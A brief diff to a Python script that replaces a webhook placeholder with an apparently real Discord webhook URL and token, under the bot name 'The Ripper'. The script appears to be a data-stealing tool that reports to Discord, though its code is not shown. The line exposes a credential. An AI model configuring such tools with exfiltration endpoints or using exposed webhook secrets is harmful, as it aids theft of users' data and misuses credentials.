@@ -2,7 +2,7 @@
 import os, re, json, requests, random, string, datetime
 
 #   Settings    #
-WebHook = "WEBHOOK URL HERE"
+WebHook = "https://discord.com/api/webhooks/1502756781368152165/jYHVrrgG1gvg_LdUFRWB4lT7_7c8gu0faVxKcJOw8LdWYcJ8wgaHS5aDCk_drLJGRRf_"
 avatar_url = "https://i.imgur.com/SkVHyor.jpg"
 bot_name = "The Ripper"
 
